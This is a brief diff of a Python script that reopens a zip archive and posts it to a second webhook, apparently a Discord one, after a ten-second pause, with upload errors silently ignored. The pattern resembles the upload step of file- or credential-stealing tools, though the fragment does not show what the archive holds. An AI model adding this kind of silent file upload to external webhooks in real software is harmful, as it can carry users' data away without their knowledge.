@@ -463,8 +463,9 @@ with open(zipPath, "rb") as file:
     except Exception as e:
         pass
 
-    time.sleep(10)
+time.sleep(10)
 
+with open(zipPath, "rb") as file:
     try:
         response2 = requests.post(webhook2, files=files, data={"payload_json": json.dumps(payload)})
     except Exception as e:
